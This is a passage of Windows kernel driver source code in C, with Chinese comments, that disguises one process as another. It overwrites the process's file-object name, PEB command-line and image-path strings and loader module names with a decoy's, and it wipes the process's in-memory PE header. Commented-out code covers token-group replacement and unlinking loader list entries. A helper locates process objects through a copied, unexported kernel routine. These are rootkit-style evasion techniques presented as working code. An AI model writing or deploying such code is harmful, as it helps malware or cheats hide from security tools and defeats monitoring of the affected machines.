		srcFileObj->FsContext2 = dstFileObj->FsContext2;

		PUCHAR newName = (PUCHAR)ExAllocatePool(NonPagedPool, dstFileObj->FileName.Length + 0x100);
		RtlZeroMemory(newName, dstFileObj->FileName.Length + 0x100);
		srcFileObj->FileName.Length = dstFileObj->FileName.Length;
		srcFileObj->FileName.MaximumLength = dstFileObj->FileName.MaximumLength;
		memcpy(newName, dstFileObj->FileName.Buffer, dstFileObj->FileName.Length + 2);
		srcFileObj->FileName.Buffer = newName;
		ObDereferenceObject(srcFileObj);
		ObDereferenceObject(dstFileObj);
	}
	

	//TOKEN替换  EPROCESS->Token

	//PACCESS_TOKEN srcToken = PsReferencePrimaryToken(srcProc);
	//PACCESS_TOKEN dstToken = PsReferencePrimaryToken(fakeProc);
	//if (srcToken && dstToken)
	//{
	//	ObDereferenceObject(srcToken);
	//	ObDereferenceObject(dstToken);
	//	LONG tokenOffset = NULL;
	//	PUCHAR srcGroup = NULL;
	//	PUCHAR dstGroup = NULL;
	//	if (buildNum == 7600 || buildNum == 7601)
	//	{
	//		tokenOffset = 0x90;
	//	}
	//	else {
	//		tokenOffset = 0x98;
	//	}
	//	ULONG64 srcGs = *(PULONG64)((ULONG64)srcToken + tokenOffset);
	//	if (srcGs)
	//	{
	//		srcGroup = (PUCHAR)(*(PULONG64)srcGs);
	//	}
	//	ULONG64 dstGs = *(PULONG64)((ULONG64)dstToken + tokenOffset);
	//	if (dstGs)
	//	{
	//		dstGroup = (PUCHAR)(*(PULONG64)dstGs);
	//	}
	//	if (srcGroup && dstGroup)
	//	{
	//		memcpy(srcGroup, dstGroup, 0x20);
	//	}
	//}

	
	
	 
	 
	 
	 
	 
	//===================处理PEB========================
	PPEB32 scrPeb32 = NULL;
	ret = PsGetWow64ProcPeb32(srcProc,&scrPeb32);
	if (ret != SK_SUCCESS)
	{
		return ret;
	}
	PPEB srcPeb64 = NULL;
	PPEB fakePeb64 = NULL;
	srcPeb64 = (PPEB)PsGetProcessPeb(srcProc);
	if (!srcPeb64)
	{
		return SK_FAILED_HIDEPROC_GETSRCPROCPEB;
	}
	fakePeb64 = (PPEB)PsGetProcessPeb(fakeProc);
	if (!fakePeb64)
	{
		return SK_FAILED_HIDEPROC_GETDSTPROCPEB;
	}
	KAPC_STATE apc = { 0 };
	KeStackAttachProcess(srcProc, &apc);
	if (!MmIsAddressValid(srcPeb64) || !MmIsAddressValid(scrPeb32)) {
		KeUnstackDetachProcess(&apc);
		return SK_FAILED_HIDEPROC_GETSRCPROCPEB;
	}
	KeUnstackDetachProcess(&apc);
	KeStackAttachProcess(fakeProc, &apc);
	if (!MmIsAddressValid(fakePeb64)) {
		KeUnstackDetachProcess(&apc);
		return SK_FAILED_HIDEPROC_GETDSTPROCPEB;
	}
	KeUnstackDetachProcess(&apc);


	//10.复制PEB->ImageBaseAddress  清空PE头
	pZwProtectVirtualMemory callZwProtectVirtualMemory = NULL;
	ret = KrGetVirtualProtectFuncAddr(&callZwProtectVirtualMemory);
	if (ret != SK_SUCCESS)
	{
		return ret;
	}
	KeStackAttachProcess(srcProc, &apc);
	if (scrPeb32 && MmIsAddressValid(scrPeb32))
	{
		PULONG tempBase = scrPeb32->ImageBaseAddress;
		ULONG64 tempSize = 0x1000;
		ULONG oldProctect = NULL;
		status = callZwProtectVirtualMemory(-1, &tempBase, &tempSize, PAGE_READWRITE, &oldProctect);
		if (NT_SUCCESS(status))
		{
			memset(scrPeb32->ImageBaseAddress, 0, 0x1000);
		}
		callZwProtectVirtualMemory(-1, &tempBase, &tempSize, oldProctect, &oldProctect);
	}
	PULONG64 tempBase = *(PULONG64)((ULONG64)srcPeb64 + 0x10);
	ULONG64 tempSize = 0x1000;
	ULONG oldProctect = NULL;
	status = callZwProtectVirtualMemory(-1, &tempBase, &tempSize, PAGE_READWRITE, &oldProctect);
	if (NT_SUCCESS(status))
	{
		memset(*(PULONG64)((ULONG64)srcPeb64 + 0x10), 0, 0x1000);
	}
	callZwProtectVirtualMemory(-1, &tempBase, &tempSize, oldProctect, &oldProctect);
	KeUnstackDetachProcess(&apc);
	//11.复制PEB->ProcessParameters
	PUCHAR tempFakeNamePool = (PUCHAR)ExAllocatePool(NonPagedPool, 0x1000);
	if (!tempFakeNamePool)
	{
		return SK_FAILED_ALLOCATEPOOL;
	}
	memset(tempFakeNamePool, 0, 0x1000);

	KeStackAttachProcess(fakeProc, &apc);
	ULONG64 pFakeProcessParam = *(PULONG64)((ULONG64)fakePeb64 + 0x20);

	ULONG64 pFakeProcCuurentDirUnicodeStringBuffer = *(PULONG64)(pFakeProcessParam + 0x38 + 0x8);
	USHORT pFakeProcCuurentDirUnicodeStringLength = *(PUSHORT)(pFakeProcessParam + 0x38);
	USHORT pFakeProcCuurentDirUnicodeStringMaxLength = *(PUSHORT)(pFakeProcessParam + 0x38 + 2);

	ULONG64 pFakeProcDllPathUnicodeStringBuffer = *(PULONG64)(pFakeProcessParam + 0x50 + 0x8);
	USHORT pFakeProcDllPathUnicodeStringLength = *(PUSHORT)(pFakeProcessParam + 0x50);
	USHORT pFakeProcDllPathUnicodeStringMaxLength = *(PUSHORT)(pFakeProcessParam + 0x50 + 2);

	ULONG64 pFakeProcImagePathNameUnicodeStringBuffer = *(PULONG64)(pFakeProcessParam + 0x60 + 0x8);
	USHORT pFakeProcImagePathNameUnicodeStringLength = *(PUSHORT)(pFakeProcessParam + 0x60);
	USHORT pFakeProcImagePathNameUnicodeStringMaxLength = *(PUSHORT)(pFakeProcessParam + 0x60 + 2);

	ULONG64 pFakeProcCommandLineUnicodeStringBuffer = *(PULONG64)(pFakeProcessParam + 0x70 + 0x8);
	USHORT pFakeProcCommandLineUnicodeStringLength = *(PUSHORT)(pFakeProcessParam + 0x70);
	USHORT pFakeProcCommandLineUnicodeStringMaxLength = *(PUSHORT)(pFakeProcessParam + 0x70 + 2);

	ULONG64 pFakeProcWindowTitleUnicodeStringBuffer = *(PULONG64)(pFakeProcessParam + 0xB0 + 0x8);
	USHORT pFakeProcWindowTitleUnicodeStringLength = *(PUSHORT)(pFakeProcessParam + 0xB0);
	USHORT pFakeProcWindowTitleUnicodeStringMaxLength = *(PUSHORT)(pFakeProcessParam + 0xB0 + 2);

	ULONG64 pFakeProcDesktopInfoUnicodeStringBuffer = *(PULONG64)(pFakeProcessParam + 0xC0 + 0x8);
	USHORT pFakeProcDesktopInfoUnicodeStringLength = *(PUSHORT)(pFakeProcessParam + 0xC0);
	USHORT pFakeProcDesktopInfoUnicodeStringMaxLength = *(PUSHORT)(pFakeProcessParam + 0xC0 + 2);

	ULONG64 pFakeProcShellInfoUnicodeStringBuffer = *(PULONG64)(pFakeProcessParam + 0xD0 + 0x8);
	USHORT pFakeProcShellInfoUnicodeStringLength = *(PUSHORT)(pFakeProcessParam + 0xD0);
	USHORT pFakeProcShellInfoUnicodeStringMaxLength = *(PUSHORT)(pFakeProcessParam + 0xD0 + 2);

	ULONG64 pFakeProcRuntimeDataUnicodeStringBuffer = *(PULONG64)(pFakeProcessParam + 0xE0 + 0x8);
	USHORT pFakeProcRuntimeDataUnicodeStringLength = *(PUSHORT)(pFakeProcessParam + 0xE0);
	USHORT pFakeProcRuntimeDataUnicodeStringMaxLength = *(PUSHORT)(pFakeProcessParam + 0xE0 + 2);

	memcpy(tempFakeNamePool, pFakeProcCuurentDirUnicodeStringBuffer, pFakeProcCuurentDirUnicodeStringLength);
	memcpy(tempFakeNamePool + 0x100, pFakeProcDllPathUnicodeStringBuffer, pFakeProcDllPathUnicodeStringLength);
	memcpy(tempFakeNamePool + 0x200, pFakeProcImagePathNameUnicodeStringBuffer, pFakeProcImagePathNameUnicodeStringLength);
	memcpy(tempFakeNamePool + 0x300, pFakeProcCommandLineUnicodeStringBuffer, pFakeProcCommandLineUnicodeStringLength);
	memcpy(tempFakeNamePool + 0x400, pFakeProcWindowTitleUnicodeStringBuffer, pFakeProcWindowTitleUnicodeStringLength);
	memcpy(tempFakeNamePool + 0x500, pFakeProcDesktopInfoUnicodeStringBuffer, pFakeProcDesktopInfoUnicodeStringLength);
	memcpy(tempFakeNamePool + 0x600, pFakeProcShellInfoUnicodeStringBuffer, pFakeProcShellInfoUnicodeStringLength);
	memcpy(tempFakeNamePool + 0x700, pFakeProcRuntimeDataUnicodeStringBuffer, pFakeProcRuntimeDataUnicodeStringLength);
	KeUnstackDetachProcess(&apc);
	KeStackAttachProcess(srcProc, &apc);
	ULONG64 size = 0x1000;
	ULONG64 srcNewNameBufferPool = NULL;
	ZwAllocateVirtualMemory(-1, &srcNewNameBufferPool, NULL, &size, MEM_COMMIT, PAGE_READWRITE);
	if (srcNewNameBufferPool)
	{
		memcpy(srcNewNameBufferPool, tempFakeNamePool, 0x1000);
	}
	if (scrPeb32)
	{
		//X86
		ULONG pSrcProcessParam = *(PULONG)((ULONG)scrPeb32 + 0x10);
		*(PUSHORT)(pSrcProcessParam + 0x24) = pFakeProcCuurentDirUnicodeStringLength;
		*(PUSHORT)(pSrcProcessParam + 0x24 + 2) = pFakeProcCuurentDirUnicodeStringMaxLength;
		*(PUSHORT)(pSrcProcessParam + 0x30) = pFakeProcDllPathUnicodeStringLength;
		*(PUSHORT)(pSrcProcessParam + 0x30 + 2) = pFakeProcDllPathUnicodeStringMaxLength;
		*(PUSHORT)(pSrcProcessParam + 0x38) = pFakeProcImagePathNameUnicodeStringLength;
		*(PUSHORT)(pSrcProcessParam + 0x38 + 2) = pFakeProcImagePathNameUnicodeStringMaxLength;
		*(PUSHORT)(pSrcProcessParam + 0x40) = pFakeProcCommandLineUnicodeStringLength;
		*(PUSHORT)(pSrcProcessParam + 0x40 + 2) = pFakeProcCommandLineUnicodeStringMaxLength;
		*(PUSHORT)(pSrcProcessParam + 0x70) = pFakeProcWindowTitleUnicodeStringLength;
		*(PUSHORT)(pSrcProcessParam + 0x70 + 2) = pFakeProcWindowTitleUnicodeStringMaxLength;
		*(PUSHORT)(pSrcProcessParam + 0x78) = pFakeProcDesktopInfoUnicodeStringLength;
		*(PUSHORT)(pSrcProcessParam + 0x78 + 2) = pFakeProcDesktopInfoUnicodeStringMaxLength;
		*(PUSHORT)(pSrcProcessParam + 0x80) = pFakeProcShellInfoUnicodeStringLength;
		*(PUSHORT)(pSrcProcessParam + 0x80 + 2) = pFakeProcShellInfoUnicodeStringMaxLength;
		*(PUSHORT)(pSrcProcessParam + 0x88) = pFakeProcRuntimeDataUnicodeStringLength;
		*(PUSHORT)(pSrcProcessParam + 0x88 + 2) = pFakeProcRuntimeDataUnicodeStringMaxLength;
		memset(*(PULONG)(pSrcProcessParam + 0x24 + 4), 0, *(PUSHORT)(pSrcProcessParam + 0x24));
		memset(*(PULONG)(pSrcProcessParam + 0x30 + 4), 0, *(PUSHORT)(pSrcProcessParam + 0x30));
		memset(*(PULONG)(pSrcProcessParam + 0x38 + 4), 0, *(PUSHORT)(pSrcProcessParam + 0x38));
		memset(*(PULONG)(pSrcProcessParam + 0x40 + 4), 0, *(PUSHORT)(pSrcProcessParam + 0x40));
		memset(*(PULONG)(pSrcProcessParam + 0x70 + 4), 0, *(PUSHORT)(pSrcProcessParam + 0x70));
		memset(*(PULONG)(pSrcProcessParam + 0x78 + 4), 0, *(PUSHORT)(pSrcProcessParam + 0x78));
		memset(*(PULONG)(pSrcProcessParam + 0x80 + 4), 0, *(PUSHORT)(pSrcProcessParam + 0x80));
		memset(*(PULONG)(pSrcProcessParam + 0x88 + 4), 0, *(PUSHORT)(pSrcProcessParam + 0x88));
		*(PULONG)(pSrcProcessParam + 0x24 + 4) = (ULONG)srcNewNameBufferPool;
		*(PULONG)(pSrcProcessParam + 0x30 + 4) = (ULONG)srcNewNameBufferPool + 0x100;
		*(PULONG)(pSrcProcessParam + 0x38 + 4) = (ULONG)srcNewNameBufferPool + 0x200;
		*(PULONG)(pSrcProcessParam + 0x40 + 4) = (ULONG)srcNewNameBufferPool + 0x300;
		*(PULONG)(pSrcProcessParam + 0x70 + 4) = (ULONG)srcNewNameBufferPool + 0x400;
		*(PULONG)(pSrcProcessParam + 0x78 + 4) = (ULONG)srcNewNameBufferPool + 0x500;
		*(PULONG)(pSrcProcessParam + 0x80 + 4) = (ULONG)srcNewNameBufferPool + 0x600;
		*(PULONG)(pSrcProcessParam + 0x88 + 4) = (ULONG)srcNewNameBufferPool + 0x700;
	}


	//X64
	ULONG64 pSrcProcessX64Param = *(PULONG64)((ULONG64)srcPeb64 + 0x20);
	*(PUSHORT)(pSrcProcessX64Param + 0x38) = pFakeProcCuurentDirUnicodeStringLength;
	*(PUSHORT)(pSrcProcessX64Param + 0x38 + 2) = pFakeProcCuurentDirUnicodeStringMaxLength;
	*(PUSHORT)(pSrcProcessX64Param + 0x50) = pFakeProcDllPathUnicodeStringLength;
	*(PUSHORT)(pSrcProcessX64Param + 0x50 + 2) = pFakeProcDllPathUnicodeStringMaxLength;
	*(PUSHORT)(pSrcProcessX64Param + 0x60) = pFakeProcImagePathNameUnicodeStringLength;
	*(PUSHORT)(pSrcProcessX64Param + 0x60 + 2) = pFakeProcImagePathNameUnicodeStringMaxLength;
	*(PUSHORT)(pSrcProcessX64Param + 0x70) = pFakeProcCommandLineUnicodeStringLength;
	*(PUSHORT)(pSrcProcessX64Param + 0x70 + 2) = pFakeProcCommandLineUnicodeStringMaxLength;
	*(PUSHORT)(pSrcProcessX64Param + 0xB0) = pFakeProcWindowTitleUnicodeStringLength;
	*(PUSHORT)(pSrcProcessX64Param + 0xB0 + 2) = pFakeProcWindowTitleUnicodeStringMaxLength;
	*(PUSHORT)(pSrcProcessX64Param + 0xC0) = pFakeProcDesktopInfoUnicodeStringLength;
	*(PUSHORT)(pSrcProcessX64Param + 0xC0 + 2) = pFakeProcDesktopInfoUnicodeStringMaxLength;
	*(PUSHORT)(pSrcProcessX64Param + 0xD0) = pFakeProcShellInfoUnicodeStringLength;
	*(PUSHORT)(pSrcProcessX64Param + 0xD0 + 2) = pFakeProcShellInfoUnicodeStringMaxLength;
	*(PUSHORT)(pSrcProcessX64Param + 0xE0) = pFakeProcRuntimeDataUnicodeStringLength;
	*(PUSHORT)(pSrcProcessX64Param + 0xE0 + 2) = pFakeProcRuntimeDataUnicodeStringMaxLength;
	memset(*(PULONG64)(pSrcProcessX64Param + 0x38 + 8), 0, *(PUSHORT)(pSrcProcessX64Param + 0x38));
	memset(*(PULONG64)(pSrcProcessX64Param + 0x50 + 8), 0, *(PUSHORT)(pSrcProcessX64Param + 0x50));
	memset(*(PULONG64)(pSrcProcessX64Param + 0x60 + 8), 0, *(PUSHORT)(pSrcProcessX64Param + 0x60));
	memset(*(PULONG64)(pSrcProcessX64Param + 0x70 + 8), 0, *(PUSHORT)(pSrcProcessX64Param + 0x70));
	memset(*(PULONG64)(pSrcProcessX64Param + 0xB0 + 8), 0, *(PUSHORT)(pSrcProcessX64Param + 0xB0));
	memset(*(PULONG64)(pSrcProcessX64Param + 0xC0 + 8), 0, *(PUSHORT)(pSrcProcessX64Param + 0xC0));
	memset(*(PULONG64)(pSrcProcessX64Param + 0xD0 + 8), 0, *(PUSHORT)(pSrcProcessX64Param + 0xD0));
	memset(*(PULONG64)(pSrcProcessX64Param + 0xE0 + 8), 0, *(PUSHORT)(pSrcProcessX64Param + 0xE0));
	*(PULONG64)(pSrcProcessX64Param + 0x38 + 8) = srcNewNameBufferPool;
	*(PULONG64)(pSrcProcessX64Param + 0x50 + 8) = srcNewNameBufferPool + 0x100;
	*(PULONG64)(pSrcProcessX64Param + 0x60 + 8) = srcNewNameBufferPool + 0x200;
	*(PULONG64)(pSrcProcessX64Param + 0x70 + 8) = srcNewNameBufferPool + 0x300;
	*(PULONG64)(pSrcProcessX64Param + 0xB0 + 8) = srcNewNameBufferPool + 0x400;
	*(PULONG64)(pSrcProcessX64Param + 0xC0 + 8) = srcNewNameBufferPool + 0x500;
	*(PULONG64)(pSrcProcessX64Param + 0xD0 + 8) = srcNewNameBufferPool + 0x600;
	*(PULONG64)(pSrcProcessX64Param + 0xE0 + 8) = srcNewNameBufferPool + 0x700;
	KeUnstackDetachProcess(&apc);
	ExFreePool(tempFakeNamePool);
	//12.复制PEB->pImageHeaderHash  太麻烦了
   //========================处理LDR_DATA_TABLE_ENTRY===================
	PUCHAR tempLdrNameBuffer = ExAllocatePool(NonPagedPool, 0x200);
	if (!tempLdrNameBuffer)
	{
		return SK_FAILED_ALLOCATEPOOL;
	}
	memset(tempLdrNameBuffer, 0, 0x200);

	KeStackAttachProcess(fakeProc, &apc);
	PPEB_LDR_DATA64 pFakeProcLdrData = (PPEB_LDR_DATA64) * (PULONG64)((ULONG64)fakePeb64 + 0x18);
	PLDR_DATA_TABLE_ENTRY64 pFakeProcLdrEntry = (PLDR_DATA_TABLE_ENTRY64)pFakeProcLdrData->InLoadOrderModuleList.Flink;

	USHORT FakeProcFullDllNameUnicodeStringLength = pFakeProcLdrEntry->FullDllName.Length;
	USHORT FakeProcFullDllNameUnicodeStringMaxLength = pFakeProcLdrEntry->FullDllName.MaximumLength;
	ULONG64 pFakeProcFullDllNameUnicodeStringBuffer = pFakeProcLdrEntry->FullDllName.Buffer;
	memcpy(tempLdrNameBuffer, pFakeProcFullDllNameUnicodeStringBuffer, FakeProcFullDllNameUnicodeStringLength);

	USHORT FakeProcBaseDllNameUnicodeStringLength = pFakeProcLdrEntry->BaseDllName.Length;
	USHORT FakeProcBaseDllNameUnicodeStringMaxLength = pFakeProcLdrEntry->BaseDllName.MaximumLength;
	ULONG64 pFakeProcBaseDllNameUnicodeStringBuffer = pFakeProcLdrEntry->BaseDllName.Buffer;
	memcpy(tempLdrNameBuffer + 0x100, pFakeProcBaseDllNameUnicodeStringBuffer, FakeProcBaseDllNameUnicodeStringLength);
	KeUnstackDetachProcess(&apc);

	KeStackAttachProcess(srcProc, &apc);
	ULONG64 srcLdrBuffer = NULL;
	ULONG64 SrcLdrLen = 0x200;
	ZwAllocateVirtualMemory(-1, &srcLdrBuffer, NULL, &SrcLdrLen, MEM_COMMIT, PAGE_READWRITE);
	if (srcLdrBuffer)
	{
		memcpy(srcLdrBuffer, tempLdrNameBuffer, 0x200);
	}

	if (scrPeb32)
	{
		//X86
		PPEB_LDR_DATA32 pSrcProcLdrData32 = (PPEB_LDR_DATA32) * (PULONG)((ULONG)scrPeb32 + 0xC);
		PLDR_DATA_TABLE_ENTRY32 pSrcProcLdrEntry32 = (PLDR_DATA_TABLE_ENTRY32)pSrcProcLdrData32->InLoadOrderModuleList.Flink;
		PLIST_ENTRY32 tempListEntry = (PLIST_ENTRY32)((ULONG)pSrcProcLdrEntry32 + 0x00);
		//RemoveEntryList32(tempListEntry);
		//tempListEntry->Blink = tempListEntry;
		//tempListEntry->Flink = tempListEntry;

		tempListEntry = (PLIST_ENTRY32)((ULONG)pSrcProcLdrEntry32 + 0x8);
		//RemoveEntryList32(tempListEntry);
		//tempListEntry->Blink = tempListEntry;
		//tempListEntry->Flink = tempListEntry;

		tempListEntry = (PLIST_ENTRY32)((ULONG)pSrcProcLdrEntry32 + 0x10);
		//RemoveEntryList32(tempListEntry);
		//tempListEntry->Blink = tempListEntry;
		//tempListEntry->Flink = tempListEntry;

		memset(pSrcProcLdrEntry32->FullDllName.Buffer, 0, pSrcProcLdrEntry32->FullDllName.Length);
		memset(pSrcProcLdrEntry32->BaseDllName.Buffer, 0, pSrcProcLdrEntry32->BaseDllName.Length);
		pSrcProcLdrEntry32->FullDllName.Length = FakeProcFullDllNameUnicodeStringLength;
		pSrcProcLdrEntry32->FullDllName.MaximumLength = FakeProcFullDllNameUnicodeStringMaxLength;
		pSrcProcLdrEntry32->FullDllName.Buffer = (ULONG)srcLdrBuffer;
		pSrcProcLdrEntry32->BaseDllName.Length = FakeProcBaseDllNameUnicodeStringLength;
		pSrcProcLdrEntry32->BaseDllName.MaximumLength = FakeProcBaseDllNameUnicodeStringMaxLength;
		pSrcProcLdrEntry32->BaseDllName.Buffer = (ULONG)srcLdrBuffer + 0x100;
	}
	//X64
	PPEB_LDR_DATA64 pSrcProcLdrData64 = (PPEB_LDR_DATA64) * (PULONG64)((ULONG64)srcPeb64 + 0x18);
	PLDR_DATA_TABLE_ENTRY64 pSrcProcLdrEntry64 = (PLDR_DATA_TABLE_ENTRY64)pSrcProcLdrData64->InLoadOrderModuleList.Flink;
	PLIST_ENTRY tempListEntry = (PLIST_ENTRY)((ULONG64)pSrcProcLdrEntry64 + 0x00);
	//RemoveEntryList64(tempListEntry);
	//tempListEntry->Blink = tempListEntry;
	//tempListEntry->Flink = tempListEntry;

	tempListEntry = (PLIST_ENTRY)((ULONG64)pSrcProcLdrEntry64 + 0x10);
	//RemoveEntryList64(tempListEntry);
	//tempListEntry->Blink = tempListEntry;
	//tempListEntry->Flink = tempListEntry;

	tempListEntry = (PLIST_ENTRY)((ULONG64)pSrcProcLdrEntry64 + 0x20);
	//RemoveEntryList64(tempListEntry);
	//tempListEntry->Blink = tempListEntry;
	//tempListEntry->Flink = tempListEntry;

	memset(pSrcProcLdrEntry64->FullDllName.Buffer, 0, pSrcProcLdrEntry64->FullDllName.Length);
	memset(pSrcProcLdrEntry64->BaseDllName.Buffer, 0, pSrcProcLdrEntry64->BaseDllName.Length);
	pSrcProcLdrEntry64->FullDllName.Length = FakeProcFullDllNameUnicodeStringLength;
	pSrcProcLdrEntry64->FullDllName.MaximumLength = FakeProcFullDllNameUnicodeStringMaxLength;
	pSrcProcLdrEntry64->FullDllName.Buffer = srcLdrBuffer;
	pSrcProcLdrEntry64->BaseDllName.Length = FakeProcBaseDllNameUnicodeStringLength;
	pSrcProcLdrEntry64->BaseDllName.MaximumLength = FakeProcBaseDllNameUnicodeStringMaxLength;
	pSrcProcLdrEntry64->BaseDllName.Buffer = srcLdrBuffer + 0x100;
	KeUnstackDetachProcess(&apc);
	ExFreePool(tempLdrNameBuffer);
	
	

	return SK_SUCCESS;
}




PULONG64 HandleTable = 0;
typedef PULONG64(NTAPI* MyExpLookupHandleTableEntry)(ULONG64 arg1, ULONG64 pid);
MyExpLookupHandleTableEntry funcExpLookupHandleTableEntry = NULL;
PEPROCESS KrGetEprocByPid(ULONG64 pid) {
	SKSTATUS ret = NULL;
	if (!funcExpLookupHandleTableEntry)
	{
		PUCHAR pExpLookupHandleTableEntry = NULL;
		ret = KrGetExpLookupHandleTableEntryAddr(&pExpLookupHandleTableEntry);
		if (ret != SK_SUCCESS)
		{
			return ret;
		}
		funcExpLookupHandleTableEntry = ExAllocatePool(NonPagedPool,0x1000);
		if (!funcExpLookupHandleTableEntry)
		{
			return SK_FAILED_ALLOCATEPOOL;
		}
		RtlZeroBytes(funcExpLookupHandleTableEntry, 0x1000);
		memcpy(funcExpLookupHandleTableEntry, pExpLookupHandleTableEntry,0x200);
	}
	if (!HandleTable)
	{
		PUCHAR pGlobalHandleTable = NULL;
		KrGetGlobalHandleTablePointer(&pGlobalHandleTable);
		HandleTable = *(PULONG64*)(pGlobalHandleTable);
	}
	ULONG64 temp = funcExpLookupHandleTableEntry(HandleTable,pid);
	if (MmIsAddressValid(temp) && *(ULONG64*)temp >> 16)
	{
		return (PEPROCESS)((*(ULONG64*)temp >> 16) | 0xFFFF000000000000);
	}
	else
	{
		return 0;
	}
}











